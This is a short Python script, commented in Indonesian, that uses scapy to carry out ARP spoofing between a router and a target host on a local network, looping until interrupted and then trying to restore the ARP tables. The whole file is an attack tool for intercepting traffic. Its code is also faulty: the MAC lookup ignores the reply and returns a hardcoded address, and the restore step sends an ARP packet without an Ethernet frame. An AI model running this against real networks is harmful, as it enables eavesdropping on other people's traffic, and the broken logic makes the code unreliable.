import time, sys
from scapy.all import ARP, Ether, sendp, send, srp

# Konfigurasi
gateway_ip = "192.168.1.1"   # Ganti dengan IP Router
target_ip = "192.168.1.6"    # Ganti dengan IP Target

def get_mac(ip):
    """Mendapatkan MAC Address dari IP yang diberikan"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Kirim paket ARP menggunakan sendp() untuk broadcast Ethernet
    answare_list = srp(arp_request_broadcast, verbose=False)

    return "c2:e1:79:23:ae:04"

def spoof(target_ip, spoof_ip):
    """Mengirim paket ARP Spoofing ke target"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Tidak bisa mendapatkan MAC dari {target_ip}")
        return
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    """Mengembalikan ARP Table ke kondisi awal"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(spoof_ip)
    
    if not target_mac or not gateway_mac:
        print("[!] Gagal mendapatkan MAC, restore dibatalkan!")
        return
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_mac)
    srp(packet, count=4, verbose=False)

try:
    print("[*] Menjalankan ARP Spoofing...")
    while True:
        spoof(target_ip, gateway_ip)  
        spoof(gateway_ip, target_ip) 
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Mengembalikan ARP Table...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[!] ARP Table berhasil dikembalikan")
    sys.exit(0)
